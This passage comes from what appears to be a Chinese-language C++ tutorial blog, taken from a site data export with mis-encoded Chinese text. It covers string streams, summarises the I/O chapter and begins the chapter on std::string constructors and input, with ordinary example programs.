123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sstream&gt; // åŒ…å« sstream å¤´æ–‡ä»¶#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iomanip&gt; // for setprecision, fixedint main() &#123; // 1. åˆ›å»º ostringstream å¯¹è±¡ std::ostringstream oss; // 2. å‘æµä¸­æ’å…¥æ•°æ®å¹¶æ ¼å¼åŒ– std::string item = &quot;Gadget&quot;; int quantity = 3; double price = 12.99; double total = quantity * price; oss &lt;&lt; &quot;Item: &quot; &lt;&lt; item &lt;&lt; &quot;\\n&quot;; // æ’å…¥å­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ oss &lt;&lt; &quot;Quantity: &quot; &lt;&lt; quantity &lt;&lt; &quot;\\n&quot;; oss &lt;&lt; &quot;Price: $&quot; &lt;&lt; std::fixed &lt;&lt; std::setprecision(2) &lt;&lt; price &lt;&lt; &quot;\\n&quot;; // æ ¼å¼åŒ–æµ®ç‚¹æ•° oss &lt;&lt; &quot;Total: $&quot; &lt;&lt; total; // æ ¼å¼åŒ–è®¾ç½®æ˜¯ç²˜æ€§çš„ // 3. è·å–æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸² std::string formatted_string = oss.str(); // 4. è¾“å‡ºæˆ–ä½¿ç”¨è¯¥å­—ç¬¦ä¸² std::cout &lt;&lt; &quot;--- Formatted Output String ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; formatted_string &lt;&lt; std::endl; /* Output: Item: Gadget Quantity: 3 Price: $12.99 Total: $38.97 */ // ostringstream å¯¹è±¡å¯ä»¥é‡ç”¨ï¼Œä½†å†…å®¹ä¼šç»§ç»­ç´¯åŠ  // oss &lt;&lt; &quot;\\nAnother line.&quot;; // std::cout &lt;&lt; &quot;\\nAfter adding more:\\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl; // å¦‚æœè¦æ¸…ç©ºå¹¶é‡ç”¨ï¼Œå¯ä»¥è°ƒç”¨ str(&quot;&quot;) æˆ–é‡æ–°æ„é€  oss.str(&quot;&quot;); // æ¸…ç©ºç¼“å†²åŒº oss.clear(); // æ¸…é™¤å¯èƒ½å­˜åœ¨çš„æµçŠ¶æ€ (è™½ç„¶è¿™é‡Œé€šå¸¸ä¸éœ€è¦) oss &lt;&lt; &quot;New content.&quot;; std::cout &lt;&lt; &quot;\\nAfter clearing and adding:\\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl; // Output: New content. return 0;&#125; ostringstream å¸¸ç”¨äºéœ€è¦åŠ¨æ€æ„å»ºåŒ…å«æ•°å€¼å’Œå…¶ä»–æ•°æ®çš„æ—¥å¿—æ¶ˆæ¯ã€æ–‡ä»¶åæˆ–æ˜¾ç¤ºæ–‡æœ¬çš„åœºæ™¯ã€‚ ä½¿ç”¨ istringstream è¿›è¡Œæ ¼å¼åŒ–è¾“å…¥å½“ä½ æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æƒ³ä»ä¸­æŒ‰ç‰¹å®šæ ¼å¼æå–æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œè§£æé…ç½®æ–‡ä»¶çš„ä¸€è¡Œæˆ–ç”¨æˆ·è¾“å…¥çš„å¤åˆæ•°æ®ï¼‰æ—¶ï¼Œistringstream éå¸¸æœ‰ç”¨ã€‚ æ­¥éª¤: åŒ…å«å¤´æ–‡ä»¶ #include &lt;sstream&gt;ã€‚ å‡†å¤‡å¥½åŒ…å«å¾…è§£ææ•°æ®çš„ std::stringã€‚ ä½¿ç”¨è¯¥å­—ç¬¦ä¸²åˆ›å»ºä¸€ä¸ª istringstream å¯¹è±¡ã€‚ åƒä½¿ç”¨ cin ä¸€æ ·ï¼Œä½¿ç”¨ &gt;&gt; ä»æµä¸­æå–æ•°æ®åˆ°å˜é‡ä¸­ã€‚ å¯ä»¥æ£€æŸ¥æµçš„çŠ¶æ€ï¼ˆå¦‚ good(), fail(), eof()) æ¥åˆ¤æ–­æå–æ˜¯å¦æˆåŠŸã€‚ ç¤ºä¾‹: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;int main() &#123; std::string data = &quot;Alice 30 95.5&quot;; // æ¨¡æ‹Ÿä¸€è¡Œæ•°æ® std::string config_line = &quot;window_width = 800&quot;; std::string csv_data = &quot;10,20,30,40&quot;; // 1. è§£æç©ºæ ¼åˆ†éš”çš„æ•°æ® std::istringstream iss1(data); std::string name; int age; double score; if (iss1 &gt;&gt; name &gt;&gt; age &gt;&gt; score) &#123; // å°è¯•æå– std::cout &lt;&lt; &quot;Parsed from data: Name=&quot; &lt;&lt; name &lt;&lt; &quot;, Age=&quot; &lt;&lt; age &lt;&lt; &quot;, Score=&quot; &lt;&lt; score &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse data string.&quot; &lt;&lt; std::endl; &#125; // 2. è§£æé…ç½®æ–‡ä»¶è¡Œ std::istringstream iss2(config_line); std::string key, eq; int value; if (iss2 &gt;&gt; key &gt;&gt; eq &gt;&gt; value &amp;&amp; key == &quot;window_width&quot; &amp;&amp; eq == &quot;=&quot;) &#123; std::cout &lt;&lt; &quot;Parsed config: Key=&quot; &lt;&lt; key &lt;&lt; &quot;, Value=&quot; &lt;&lt; value &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to parse config line.&quot; &lt;&lt; std::endl; &#125; // 3. è§£æé€—å·åˆ†éš”çš„æ•°æ® (éœ€è¦æ‰‹åŠ¨å¤„ç†åˆ†éš”ç¬¦) std::istringstream iss3(csv_data); std::vector&lt;int&gt; numbers; int num; char comma; while (iss3 &gt;&gt; num) &#123; // è¯»å–ä¸€ä¸ªæ•°å­— numbers.push_back(num); if (iss3 &gt;&gt; comma &amp;&amp; comma == &#x27;,&#x27;) &#123; // è¯»å–å¹¶æ£€æŸ¥é€—å· continue; // å¦‚æœæœ‰é€—å·ï¼Œç»§ç»­å¾ªç¯ &#125; else &#123; break; // å¦‚æœæ²¡æœ‰é€—å·æˆ–è¯»å–å¤±è´¥ï¼Œç»“æŸå¾ªç¯ &#125; &#125; // æ£€æŸ¥æµçŠ¶æ€ï¼Œç¡®ä¿æ˜¯å› ä¸ºåˆ°è¾¾æœ«å°¾è€Œä¸æ˜¯å…¶ä»–é”™è¯¯ if (!iss3.eof() &amp;&amp; iss3.fail() &amp;&amp; !iss3.bad()) &#123; // å¯èƒ½æœ€åä¸€ä¸ªæ•°å­—åé¢æ²¡æœ‰é€—å·ï¼Œè¿™æ˜¯æ­£å¸¸çš„ &#125; else if (!iss3.eof()) &#123; std::cerr &lt;&lt; &quot;Error parsing CSV data.&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Parsed CSV numbers: &quot;; for (int n : numbers) &#123; std::cout &lt;&lt; n &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; istringstream å¸¸ç”¨äºè§£æä»æ–‡ä»¶ã€ç½‘ç»œæˆ–ç”¨æˆ·ç•Œé¢æ¥æ”¶åˆ°çš„æ–‡æœ¬æ•°æ®ã€‚ ä½¿ç”¨ stringstream è¿›è¡Œè¯»å†™stringstream å…è®¸ä½ åœ¨åŒä¸€ä¸ªå­—ç¬¦ä¸²ç¼“å†²åŒºä¸Šè¿›è¡Œè¾“å…¥å’Œè¾“å‡ºæ“ä½œã€‚ä½ å¯ä»¥å…ˆå‘å…¶ä¸­å†™å…¥æ•°æ®ï¼Œç„¶åä»ä¸­è¯»å–æ•°æ®ï¼Œæˆ–è€…åè¿‡æ¥ã€‚ ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;sstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::stringstream ss; // 1. å†™å…¥æ•°æ®åˆ° stringstream int val1 = 10; double val2 = 3.14; ss &lt;&lt; &quot;Data: &quot; &lt;&lt; val1 &lt;&lt; &quot; &quot; &lt;&lt; val2; // 2. ä»åŒä¸€ä¸ª stringstream è¯»å–æ•°æ® std::string label; int read_val1; double read_val2; // åœ¨è¯»å–ä¹‹å‰ï¼Œé€šå¸¸ä¸éœ€è¦æ˜¾å¼é‡ç½®ä½ç½®ï¼Œå› ä¸ºå†™å…¥æŒ‡é’ˆå’Œè¯»å–æŒ‡é’ˆæ˜¯ç‹¬ç«‹çš„ // ä½†å¦‚æœå†™å…¥åç«‹å³è¯»å–ï¼Œè¯»å–æŒ‡é’ˆä»åœ¨å¼€å¤´ if (ss &gt;&gt; label &gt;&gt; read_val1 &gt;&gt; read_val2) &#123; std::cout &lt;&lt; &quot;Read from stringstream: Label=&quot; &lt;&lt; label &lt;&lt; &quot;, Val1=&quot; &lt;&lt; read_val1 &lt;&lt; &quot;, Val2=&quot; &lt;&lt; read_val2 &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to read from stringstream.&quot; &lt;&lt; std::endl; &#125; // 3. æ¸…ç©ºå¹¶é‡ç”¨ï¼Œå…ˆè¯»å–åå†™å…¥ ss.str(&quot;100 Hello&quot;); // è®¾ç½®æ–°çš„å†…å®¹ï¼Œå¹¶é‡ç½®è¯»å†™ä½ç½® ss.clear(); // æ¸…é™¤ EOF æˆ–å…¶ä»–çŠ¶æ€ int num; std::string word; ss &gt;&gt; num &gt;&gt; word; // è¯»å– 100 å’Œ &quot;Hello&quot; // å†™å…¥æ–°å†…å®¹ (ä¼šè¦†ç›–æˆ–è¿½åŠ ï¼Œå–å†³äºå®ç°å’ŒæŒ‡é’ˆä½ç½®ï¼Œé€šå¸¸æ˜¯è¦†ç›–) // ä¸ºäº†å®‰å…¨åœ°è¿½åŠ ï¼Œæœ€å¥½å…ˆè·å–å½“å‰å†…å®¹ï¼Œè¿½åŠ åå†è®¾ç½®å›å»ï¼Œæˆ–è€…ä½¿ç”¨ ostringstream std::string current_content = ss.str(); // è·å– &quot;100 Hello&quot; ss.str(&quot;&quot;); // æ¸…ç©º ss.clear(); ss &lt;&lt; current_content &lt;&lt; &quot; World &quot; &lt;&lt; num * 2; // å†™å…¥æ—§å†…å®¹ã€æ–°å†…å®¹å’Œè®¡ç®—ç»“æœ std::cout &lt;&lt; &quot;Final stringstream content: &quot; &lt;&lt; ss.str() &lt;&lt; std::endl; // Output: 100 Hello World 200 return 0;&#125; stringstream åœ¨éœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤šæ¬¡æ ¼å¼åŒ–è½¬æ¢æˆ–è§£æçš„åœºæ™¯ä¸­å¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚åœ¨ä¸åŒæ ¼å¼ä¹‹é—´è½¬æ¢æ•°æ®ã€‚ æ€»ç»“: å­—ç¬¦ä¸²æµæä¾›äº†ä¸€ç§å¼ºå¤§è€Œçµæ´»çš„æ–¹å¼ï¼Œå¯ä»¥åœ¨å†…å­˜ä¸­å®Œæˆæ•°æ®çš„æ ¼å¼åŒ–å’Œè§£æï¼Œå…¶æ¥å£ä¸æ ‡å‡†çš„æ§åˆ¶å°å’Œæ–‡ä»¶ I/O ä¿æŒä¸€è‡´ï¼Œæ˜“äºå­¦ä¹ å’Œä½¿ç”¨ã€‚ 17.6 æ€»ç»“æœ¬ç« è¯¦ç»†ä»‹ç»äº† C++ çš„è¾“å…¥/è¾“å‡º (I/O) ç³»ç»Ÿï¼Œè¯¥ç³»ç»ŸåŸºäºæµ (Stream) çš„æ¦‚å¿µï¼Œæä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æ¥å¤„ç†æ¥è‡ªä¸åŒæºï¼ˆé”®ç›˜ã€æ–‡ä»¶ï¼‰å’Œå»å¾€ä¸åŒç›®çš„åœ°ï¼ˆå±å¹•ã€æ–‡ä»¶ï¼‰çš„æ•°æ®æµã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š I/O æ¦‚è¿°: æµ: å­—èŠ‚åºåˆ—çš„æŠ½è±¡ï¼Œç”¨äºè¿æ¥ç¨‹åºå’Œ I/O è®¾å¤‡ã€‚ ç¼“å†²åŒº: ä¸´æ—¶å­˜å‚¨åŒºåŸŸï¼Œç”¨äºæé«˜ I/O æ•ˆç‡ã€‚åˆ†ä¸ºå®Œå…¨ç¼“å†²ã€è¡Œç¼“å†²ã€æ— ç¼“å†²ã€‚ &lt;iostream&gt;: æä¾›äº†æ ¸å¿ƒ I/O ç±»ï¼ˆios_base, ios, istream, ostream, iostreamï¼‰å’Œæ ‡å‡†æµå¯¹è±¡ (cin, cout, cerr, clog)ã€‚ é‡å®šå‘: æ“ä½œç³»ç»ŸåŠŸèƒ½ï¼Œå…è®¸æ”¹å˜æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯æµçš„æ¥æºå’Œç›®çš„åœ°ï¼Œè€Œæ— éœ€ä¿®æ”¹ä»£ç ã€‚ ä½¿ç”¨ cout è¾“å‡º: ä¸»è¦ä½¿ç”¨é‡è½½çš„æ’å…¥è¿ç®—ç¬¦ (&lt;&lt;) è¾“å‡ºå„ç§æ•°æ®ç±»å‹ã€‚ æ”¯æŒé“¾æ¥æ“ä½œ (cout &lt;&lt; a &lt;&lt; b;)ã€‚ æä¾› put() è¾“å‡ºå•ä¸ªå­—ç¬¦ï¼Œwrite() è¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°çš„å†…å­˜å—ã€‚ ç¼“å†²åŒºåˆ·æ–°: å¯ä»¥é€šè¿‡ endl (æ¢è¡Œå¹¶åˆ·æ–°)ã€flush (ä»…åˆ·æ–°)ã€ends (æ’å…¥ \\0 å¹¶åˆ·æ–°) æˆ–åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨åˆ·æ–°ã€‚&#39;\\n&#39; åªæ’å…¥æ¢è¡Œç¬¦ã€‚ æ ¼å¼åŒ–: å¯ä»¥é€šè¿‡æˆå‘˜å‡½æ•° (width(), precision(), fill(), setf()) æˆ–æ“çºµç¬¦ (setw(), setprecision(), setfill(), fixed, scientific, hex, oct, dec, left, right, boolalpha ç­‰ï¼Œéœ€åŒ…å« &lt;iomanip&gt;) æ§åˆ¶è¾“å‡ºçš„å®½åº¦ã€ç²¾åº¦ã€å¡«å……ã€å¯¹é½ã€åŸºæ•°ã€æµ®ç‚¹æ•°è¡¨ç¤ºç­‰ã€‚ ä½¿ç”¨ cin è¾“å…¥: ä¸»è¦ä½¿ç”¨é‡è½½çš„æå–è¿ç®—ç¬¦ (&gt;&gt;) è¯»å–æ•°æ®ã€‚é»˜è®¤è·³è¿‡å‰å¯¼ç©ºç™½ï¼Œè¯»å–ç›´åˆ°é‡åˆ°ä¸åŒ¹é…å­—ç¬¦æˆ–ç©ºç™½ã€‚ æµçŠ¶æ€: cin ç»´æŠ¤çŠ¶æ€ä½ (goodbit, eofbit, failbit, badbit)ã€‚å¯ä»¥é€šè¿‡ good(), eof(), fail(), bad() æˆ–æµå¯¹è±¡æœ¬èº«åœ¨å¸ƒå°”ä¸Šä¸‹æ–‡ä¸­æ£€æŸ¥çŠ¶æ€ã€‚failbit è¡¨ç¤ºæ ¼å¼é”™è¯¯ï¼Œeofbit è¡¨ç¤ºåˆ°è¾¾æ–‡ä»¶å°¾ã€‚ é”™è¯¯å¤„ç†: è¯»å–å¤±è´¥åï¼Œéœ€ä½¿ç”¨ clear() æ¸…é™¤é”™è¯¯çŠ¶æ€ï¼Œå¹¶ä½¿ç”¨ ignore() ä¸¢å¼ƒç¼“å†²åŒºä¸­çš„æ— æ•ˆè¾“å…¥ã€‚ å…¶ä»–æ–¹æ³•: get() (è¯»å–å•ä¸ªå­—ç¬¦ï¼Œä¸è·³è¿‡ç©ºç™½)ã€getline() (è¯»å–ä¸€è¡Œåˆ° C é£æ ¼æ•°ç»„ï¼Œä¸¢å¼ƒåˆ†éš”ç¬¦)ã€read() (è¯»å–æŒ‡å®šå­—èŠ‚æ•°)ã€peek() (æŸ¥çœ‹ä¸‹ä¸€ä¸ªå­—ç¬¦)ã€gcount() (è·å–ä¸Šæ¬¡è¯»å–çš„å­—ç¬¦æ•°)ã€putback() (æ”¾å›å­—ç¬¦)ã€ignore() (ä¸¢å¼ƒå­—ç¬¦)ã€‚ æ–‡ä»¶ I/O (&lt;fstream&gt;): ä½¿ç”¨ ifstream (è¾“å…¥)ã€ofstream (è¾“å‡º)ã€fstream (è¾“å…¥/è¾“å‡º) ç±»ã€‚ é€šè¿‡æ„é€ å‡½æ•°æˆ– open() æ–¹æ³•å…³è”æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šæ–‡ä»¶æ¨¡å¼ (in, out, app, ate, binary, trunc)ã€‚ å¿…é¡»ä½¿ç”¨ is_open() æˆ–æ£€æŸ¥æµçŠ¶æ€æ¥ç¡®è®¤æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€ã€‚ ä½¿ç”¨ä¸ cin/cout ç±»ä¼¼çš„æ“ä½œç¬¦å’Œæ–¹æ³•è¿›è¡Œè¯»å†™ã€‚ æ–‡ä»¶æµå¯¹è±¡åœ¨é”€æ¯æ—¶è‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚ å¯ä»¥é€šè¿‡ argc å’Œ argv å¤„ç†å‘½ä»¤è¡Œå‚æ•°æ¥æŒ‡å®šæ–‡ä»¶åã€‚ éšæœºå­˜å–: ä½¿ç”¨ seekg() / tellg() (è¾“å…¥æŒ‡é’ˆ) å’Œ seekp() / tellp() (è¾“å‡ºæŒ‡é’ˆ) åœ¨æ–‡ä»¶ä¸­å®šä½è¯»å†™ä½ç½®ï¼Œå¸¸ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ å†…æ ¸æ ¼å¼åŒ– (&lt;sstream&gt;): åœ¨å†…å­˜ä¸­è¿›è¡Œæ ¼å¼åŒ–è½¬æ¢ã€‚ ostringstream: å°†å„ç§æ•°æ®ç±»å‹æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºï¼Œé€šè¿‡ str() è·å–ç»“æœå­—ç¬¦ä¸²ã€‚ istringstream: å°†å·²æœ‰å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥æºï¼Œä»ä¸­æŒ‰æ ¼å¼è§£ææå–æ•°æ®ã€‚ stringstream: æ”¯æŒå¯¹åŒä¸€ä¸ªå†…éƒ¨å­—ç¬¦ä¸²ç¼“å†²åŒºè¿›è¡Œè¯»å†™æ“ä½œã€‚ æ¥å£ä¸æ–‡ä»¶æµå’Œæ§åˆ¶å°æµä¸€è‡´ï¼Œæ”¯æŒæ ¼å¼åŒ–æ“çºµç¬¦ã€‚ C++ çš„ iostream åº“æä¾›äº†ä¸€ä¸ªç±»å‹å®‰å…¨ã€å¯æ‰©å±•ä¸”åŠŸèƒ½ä¸°å¯Œçš„ I/O æ¡†æ¶ï¼Œé€‚ç”¨äºæ§åˆ¶å°ã€æ–‡ä»¶ä»¥åŠå†…å­˜ä¸­çš„æ ¼å¼åŒ–æ“ä½œã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 16 string ç±»å’Œæ ‡å‡†æ¨¡æ¿åº“","slug":"Cpp_tutorial_Chapter_16","date":"2025-04-30T15:42:24.021Z","updated":"2025-04-30T15:40:40.028Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_16/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_16/","excerpt":"","text":"16.1 string ç±»æˆ‘ä»¬åœ¨ç¬¬ 4 ç« å·²ç»åˆæ­¥æ¥è§¦äº† C++ æ ‡å‡†åº“ä¸­çš„ string ç±»ã€‚ä¸ C è¯­è¨€é£æ ¼çš„ã€ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„ï¼ˆC-é£æ ¼å­—ç¬¦ä¸²ï¼‰ç›¸æ¯”ï¼Œstring ç±»æä¾›äº†æ›´å¼ºå¤§ã€æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ã€‚ ä¼˜ç‚¹: è‡ªåŠ¨å†…å­˜ç®¡ç†: string å¯¹è±¡ä¼šè‡ªåŠ¨ç®¡ç†å­˜å‚¨å­—ç¬¦ä¸²æ‰€éœ€çš„å†…å­˜ï¼Œæ— éœ€æ‰‹åŠ¨åˆ†é…å’Œé‡Šæ”¾ï¼Œé¿å…äº†è®¸å¤š C é£æ ¼å­—ç¬¦ä¸²å¸¸è§çš„å†…å­˜é”™è¯¯ï¼ˆå¦‚ç¼“å†²åŒºæº¢å‡ºï¼‰ã€‚ ä¸°å¯Œçš„æ“ä½œ: æä¾›äº†å¤§é‡çš„æˆå‘˜å‡½æ•°ç”¨äºå­—ç¬¦ä¸²çš„æŸ¥æ‰¾ã€æ‹¼æ¥ã€æ¯”è¾ƒã€ä¿®æ”¹ã€æ’å…¥ã€åˆ é™¤ç­‰æ“ä½œã€‚ å®‰å…¨æ€§: æˆå‘˜å‡½æ•°é€šå¸¸ä¼šè¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼ˆå¦‚ at() æ–¹æ³•ï¼‰ï¼Œæˆ–è€…æä¾›æ˜ç¡®å®šä¹‰çš„æ“ä½œè¡Œä¸ºã€‚ ä¸ STL å…¼å®¹: å¯ä»¥æ–¹ä¾¿åœ°ä¸æ ‡å‡†æ¨¡æ¿åº“ (STL) ä¸­çš„ç®—æ³•å’Œå®¹å™¨ä¸€èµ·ä½¿ç”¨ã€‚ string ç±»å®é™…ä¸Šæ˜¯æ¨¡æ¿ç±» basic_string&lt;char&gt; çš„ä¸€ä¸ª typedefï¼ˆç±»å‹åˆ«åï¼‰ã€‚å®ƒå®šä¹‰åœ¨ &lt;string&gt; å¤´æ–‡ä»¶ä¸­ã€‚ 1#include &lt;string&gt; // å¿…é¡»åŒ…å«æ­¤å¤´æ–‡ä»¶ 16.1.1 æ„é€ å­—ç¬¦ä¸²åˆ›å»º string å¯¹è±¡æœ‰å¤šç§æ–¹å¼ï¼ˆæ„é€ å‡½æ•°ï¼‰ï¼š é»˜è®¤æ„é€ å‡½æ•°: åˆ›å»ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚ 1std::string s1; // s1 æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸² &quot;&quot; *ä» C é£æ ¼å­—ç¬¦ä¸² (const char)**: ç”¨ä¸€ä¸ª C é£æ ¼å­—ç¬¦ä¸²æ¥åˆå§‹åŒ– string å¯¹è±¡ã€‚ 123std::string s2 = &quot;Hello&quot;; // ä»å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–const char* c_str = &quot;World&quot;;std::string s3(c_str); // ä» const char* å˜é‡åˆå§‹åŒ– å¤åˆ¶æ„é€ å‡½æ•°: ç”¨å¦ä¸€ä¸ª string å¯¹è±¡æ¥åˆå§‹åŒ–ã€‚ 12std::string s4 = s2; // s4 çš„å†…å®¹æ˜¯ &quot;Hello&quot;std::string s5(s4); // s5 çš„å†…å®¹ä¹Ÿæ˜¯ &quot;Hello&quot; ä» C é£æ ¼å­—ç¬¦ä¸²çš„éƒ¨åˆ†å†…å®¹: ç”¨ C é£æ ¼å­—ç¬¦ä¸²çš„å‰ n ä¸ªå­—ç¬¦åˆå§‹åŒ–ã€‚ 12const char* long_cstr = &quot;Programming&quot;;std::string s6(long_cstr, 7); // ç”¨ &quot;Programming&quot; çš„å‰ 7 ä¸ªå­—ç¬¦åˆå§‹åŒ– s6ï¼Œå†…å®¹æ˜¯ &quot;Program&quot; ä» string å¯¹è±¡çš„éƒ¨åˆ†å†…å®¹ (å­å­—ç¬¦ä¸²): ç”¨å¦ä¸€ä¸ª string å¯¹è±¡çš„å­å­—ç¬¦ä¸²åˆå§‹åŒ–ã€‚ 12std::string s7 = &quot;Example String&quot;;std::string s8(s7, 8, 6); // ä» s7 çš„ç´¢å¼• 8 å¼€å§‹ï¼Œå– 6 ä¸ªå­—ç¬¦åˆå§‹åŒ– s8ï¼Œå†…å®¹æ˜¯ &quot;String&quot; å¡«å……æ„é€ å‡½æ•°: ç”¨ n ä¸ªé‡å¤çš„å­—ç¬¦ c åˆå§‹åŒ–ã€‚ 1std::string s9(10, &#x27;-&#x27;); // s9 çš„å†…å®¹æ˜¯ &quot;----------&quot; ä»è¿­ä»£å™¨èŒƒå›´: ç”¨ä¸€å¯¹æŒ‡å‘å­—ç¬¦åºåˆ—çš„è¿­ä»£å™¨ï¼ˆä¾‹å¦‚æ¥è‡ªå¦ä¸€ä¸ªå®¹å™¨æˆ– C é£æ ¼æ•°ç»„ï¼‰æ¥åˆå§‹åŒ–ã€‚ 12345char char_array[] = &#123;&#x27;T&#x27;, &#x27;e&#x27;, &#x27;s&#x27;, &#x27;t&#x27;&#125;;std::string s10(char_array, char_array + sizeof(char_array)); // s10 å†…å®¹æ˜¯ &quot;Test&quot;std::vector&lt;char&gt; char_vec = &#123;&#x27;D&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;a&#x27;&#125;;std::string s11(char_vec.begin(), char_vec.end()); // s11 å†…å®¹æ˜¯ &quot;Data&quot; ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11): 12std::string s12 = &#123;&#x27;I&#x27;, &#x27;n&#x27;, &#x27;i&#x27;, &#x27;t&#x27;&#125;; // s12 å†…å®¹æ˜¯ &quot;Init&quot;std::string s13 &#123;&quot;List&quot;&#125;; // s13 å†…å®¹æ˜¯ &quot;List&quot; ç¤ºä¾‹: 123456789101112131415161718192021222324#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;vector&gt;int main() &#123; std::string s1; std::string s2 = &quot;Hello&quot;; std::string s3(s2); std::string s4(5, &#x27;x&#x27;); const char* phrase = &quot;World Wide Web&quot;; std::string s5(phrase, 5); // &quot;World&quot; std::string s6(phrase + 6, 4); // &quot;Wide&quot; (ä»ç´¢å¼•6å¼€å§‹å–4ä¸ª) std::string s7(s2, 1, 3); // ä» s2[1] å¼€å§‹å– 3 ä¸ª: &quot;ell&quot; std::cout &lt;&lt; &quot;s1: &quot; &lt;&lt; s1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s2: &quot; &lt;&lt; s2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s3: &quot; &lt;&lt; s3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s5: &quot; &lt;&lt; s5 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s6: &quot; &lt;&lt; s6 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;s7: &quot; &lt;&lt; s7 &lt;&lt; std::endl; return 0;&#125; 16.1.2 string ç±»è¾“å…¥ä»è¾“å…¥æµï¼ˆå¦‚ cinï¼‰è¯»å–æ•°æ®åˆ° string å¯¹è±¡ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼š ä½¿ç”¨ operator&gt;&gt;: è¡Œä¸ºç±»ä¼¼äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²æˆ–åŸºæœ¬æ•°æ®ç±»å‹ã€‚ å®ƒä¼šè·³è¿‡å¼€å¤´çš„æ‰€æœ‰ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚ ç„¶åè¯»å–éç©ºç™½å­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¸ºæ­¢ã€‚ è¯»å–çš„å†…å®¹ï¼ˆä¸åŒ…æ‹¬ç»“å°¾çš„ç©ºç™½å­—ç¬¦ï¼‰å­˜å‚¨åœ¨ string å¯¹è±¡ä¸­ã€‚ 12345678910111213141516171819#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;sstream&gt; // ç”¨äºå­—ç¬¦ä¸²æµç¤ºä¾‹int main() &#123; std::string word1, word2; std::cout &lt;&lt; &quot;Enter two words separated by space: &quot;; // ä¾‹å¦‚è¾“å…¥ &quot;Hello World&quot; std::cin &gt;&gt; word1 &gt;&gt; word2; std::cout &lt;&lt; &quot;Word 1: &quot; &lt;&lt; word1 &lt;&lt; std::endl; // è¾“å‡º &quot;Hello&quot; std::cout &lt;&lt; &quot;Word 2: &quot; &lt;&lt; word2 &lt;&lt; std::endl; // è¾“å‡º &quot;World&quot; // æ¼”ç¤ºè·³è¿‡ç©ºç™½ std::stringstream ss(&quot; LeadingSpaces Word&quot;); std::string temp; ss &gt;&gt; temp; std::cout &lt;&lt; &quot;After skipping spaces: &quot; &lt;&lt; temp &lt;&lt; std::endl; // è¾“å‡º &quot;LeadingSpaces&quot; return 0;&#125; ä½¿ç”¨ getline() å‡½æ•°: ç”¨äºè¯»å–ä¸€æ•´è¡Œè¾“å…¥ï¼Œç›´åˆ°é‡åˆ°æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºæ¢è¡Œç¬¦ \\nï¼‰ã€‚ ä¸ä¼šè·³è¿‡å¼€å¤´çš„ç©ºç™½å­—ç¬¦ã€‚ è¯»å–çš„å†…å®¹ï¼ˆä¸åŒ…æ‹¬åˆ†éš”ç¬¦æœ¬èº«ï¼‰å­˜å‚¨åœ¨ string å¯¹è±¡ä¸­ã€‚ 